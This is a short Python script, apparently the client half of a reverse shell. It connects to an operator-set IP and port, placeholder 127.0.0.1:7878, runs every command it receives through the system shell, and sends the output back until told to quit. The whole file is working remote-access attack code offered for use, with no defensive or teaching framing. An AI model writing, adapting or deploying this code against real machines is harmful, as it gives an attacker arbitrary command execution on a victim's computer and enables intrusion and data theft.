import socket
import subprocess
import os
                               #can only read files ...cant download !!!
os.system('cls')

blue = '\x1b[34m'
green = '\x1b[32m'
red = '\x1b[41m'
cyan = '\x1b[36m'
red2 = '\x1b[31m'
stop = '\x1b[0m'

ip = '127.0.0.1'                      #  Edit the ip_address
port = 7878                           #  Edit the port

try:
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((ip, port))
    print(f'{green}*** connected to {ip} @ {port} ***{stop}')

except Exception as e:
    print(f'{red}{e}{stop}')

else:
    try:
        msg = server.recv(8192).decode('utf-8')
        print(f'{green}{msg}{stop}')

        while msg != 'quit':
            try:
                msg = str(msg)
                result = subprocess.check_output(msg, shell=True)
                server.send(result)
                msg = server.recv(8192).decode('utf-8')
                print(f'{green}{msg}{stop}')
            except Exception as e:
                print(f'{red}{e}{stop}')
        print(f'{green}Disconnected from {ip} !{stop}')
    except Exception as e1:
        print(f'{red}{e1}{stop}')
